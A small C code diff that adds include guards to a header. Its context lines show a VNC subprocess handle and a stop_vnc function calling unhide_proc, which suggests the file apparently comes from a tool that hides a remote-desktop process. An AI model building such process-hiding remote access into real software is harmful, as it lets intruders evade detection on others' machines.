@@ -1,3 +1,6 @@
+#ifndef VNC_H
+#define VNC_H
+
 struct n_subprocess_info *vnc_sub_info;
 
 pid_t vnc_pid;
@@ -58,3 +61,5 @@ void stop_vnc(void)
 		unhide_proc(vnc_pid);
 	}
 }
+
+#endif /* VNC_H */
